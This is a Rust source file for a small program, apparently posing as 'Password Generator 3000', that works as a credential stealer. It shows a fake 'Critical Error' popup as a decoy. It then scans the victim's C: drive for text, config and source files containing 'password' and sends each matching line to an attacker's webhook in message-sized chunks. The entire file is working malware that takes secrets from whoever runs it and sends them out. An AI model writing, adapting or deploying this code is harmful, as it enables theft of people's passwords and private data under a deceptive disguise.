mod webhook;
mod window;
mod scan;

#[tokio::main]
async fn main() {
    window::error_popup("Critical Error", "The process has encountered a critical error.");
    let hook = webhook::Hook::new(include_str!("webhook_link"), "Password Generator 3000", "https://github.com/fluidicon.png").await;
    let scan_result = scan::scan_drive(
        r"C:\",
        vec!["txt", "py", "rs", "config", "conf", "ini", "toml", "json", "xml", "html", "md"],
        vec!["password"],
        vec!["Program Files", "Program Files (x86)", "ProgramData", "SWSetup", ".cargo", ".rustup", ".vscode", "AppData", "curseforge", "Windows"],
    );
    let mut message = "".to_string();
    for line in scan_result.lines {
        let line_message = format_message(&line.file, &line.contents.trim(), &line.keyword, &line.filetype);
        if message.len() + line_message.len() > 2000 {
            hook.send(&message).await;
            message = line_message;
        } else {
            message = message + "\n" + &line_message;
        }
    }
    if message.len() != 0 {
        hook.send(&message).await;
    }
}

fn format_message(filename: &str, line: &str, keyword: &str, filetype: &str) -> String {
    format!("### Found '{}' in\n`{}`\n```{}\n{}\n```", keyword, filename, filetype, line)
}